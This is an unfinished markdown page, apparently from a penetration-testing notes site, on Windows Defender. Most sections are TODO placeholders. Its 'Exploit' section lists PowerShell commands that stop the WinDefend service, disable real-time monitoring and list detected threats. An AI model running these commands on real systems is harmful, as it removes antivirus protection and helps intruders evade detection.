---
layout: default
title: Windows Defender
parent: Antivirus
nav_order: 1
permalink: /antivirus/windefend/
---

# Windows Defender
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

TODO: Describe the vulnerability here.

## Prerequisites

* TODO: List prerequisites here.

## Exploit

```bash
# Check Windows Defender status.
Get-Service WinDefend

# Stop it if you can...
Stop-Service WinDefend -PassThru

# ...or disable real time monitoring!
Set-MpPreference -DisableRealtimeMonitoring 1

# Check which files have been detected.
Get-MpThreatDetection
```

## Useful links

* TODO: List links here.

## Recommendations

- [ ] TODO: List recommendations here.